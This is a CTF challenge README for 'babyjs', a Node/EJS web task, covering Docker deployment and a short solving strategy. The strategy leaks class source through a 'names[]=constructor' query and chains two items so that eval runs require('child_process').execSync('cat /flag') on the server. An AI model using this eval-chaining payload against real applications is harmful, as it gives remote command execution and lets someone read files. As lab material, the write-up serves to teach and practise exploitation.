# babyjs
## Info
* Title:babyjs
* Description: read /flag 
* Attachment: diff

## Deploy
* Requirement
 docker-compose, 30002/tcp
 <br>
* bash script
 ```bash
 cd deploy
 ./run.sh
 ```


## Solving Strategy

1. You can find "bag[names[i]]" in the diff file ("/src/views/bag.ejs")
2. If you send the query "GET /items/bag?names[]=constructor", you can get the source code of class Bag
 - bag[constructor] ==> bag.constructor
3. Add an item(Name:"@neRing"), you can run its description with "eval()". but, description length < 30
4. Add below items.
 - First item
 name: a
 value: require('child_process').execSync('cat /flag')

 - Second item
 name: @neRing
 value: this.a=eval(this.a)
5. Get the flag.
